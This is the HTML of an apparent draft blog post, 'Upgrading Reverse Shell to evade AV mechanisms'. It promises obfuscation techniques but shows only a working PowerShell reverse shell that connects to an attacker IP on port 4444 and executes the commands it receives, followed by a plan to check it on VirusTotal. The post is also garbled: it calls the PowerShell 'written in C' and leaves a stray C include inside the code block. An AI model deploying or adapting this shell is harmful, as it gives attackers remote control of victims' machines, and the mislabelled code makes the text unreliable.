<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>My First Post | My Hugo Blog</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="">
    <meta name="generator" content="Hugo 0.145.0">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >




    

    
      

    

    

    
      <link rel="canonical" href="http://localhost:1313/posts/my-first-post/">
    

    <meta property="og:url" content="http://localhost:1313/posts/my-first-post/">
  <meta property="og:site_name" content="My Hugo Blog">
  <meta property="og:title" content="My First Post">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-03-11T15:11:00+00:00">
    <meta property="article:modified_time" content="2025-03-11T15:11:00+00:00">

  <meta itemprop="name" content="My First Post">
  <meta itemprop="datePublished" content="2025-03-11T15:11:00+00:00">
  <meta itemprop="dateModified" content="2025-03-11T15:11:00+00:00">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="My First Post">

	
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  <header>
    <div class="bg-black">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
      
        2025 Blog Posts
      
    </a>
    <div class="flex-l items-center">
      

      
      <div class="ananke-socials"></div>

    </div>
  </div>
</nav>

    </div>
  </header>



    <main class="pb7" role="main">
      
  
  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">Upgrading Reverse Shell to evade AV mechanisms</h1>
<h3>This post will discuss reverse shells in general and how to improve their effectiveness to evade antivirus tools, we will be 
  looking at some of the techniques which can be used to obfuscate and generate robust callback scripts to the attacking machine.  

  I will be using powershell in this scenario, but the techniques mentioned are same regardless of the programming language used.
  Below is an example of a reverse shell script that attempts to connect back to a machine, once executed.
</h3>
  <div>
    <h3>PowerShell Snippet</h3>
    <pre><code>
        #include <winsock2.h>
          <pre><code class="language-powershell">
            # Reverse Shell in PowerShell
            $ip = "192.168.1.100"
            $port = 4444
            $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            
            while ($client.Connected) {
                $command = $reader.ReadLine()
                if ($command -eq "exit") { break }
                try {
                    $output = (Invoke-Expression -Command $command 2>&1 | Out-String)
                }
                catch {
                    $output = "Error: $_"
                }
                $writer.WriteLine($output)
            }
            $reader.Close()
            $writer.Close()
            $client.Close()
            </code></pre>            
</div>
      <h3>This is a generic reverse shell written in C. already, you can tell that this is very suspicious,
         as it is very easy to guess whats going on. In a nutshell, this code generate a socket connection to the specified IP
          and the port number, once the connection is established, it reads the commands sent by the attacker. </h3>
      
      <h3>Lets save this and check its results on virustotal.com</h3>

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><ul class="pa0">
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l">




</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
    &copy;  2025 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>

  </body>
</html>
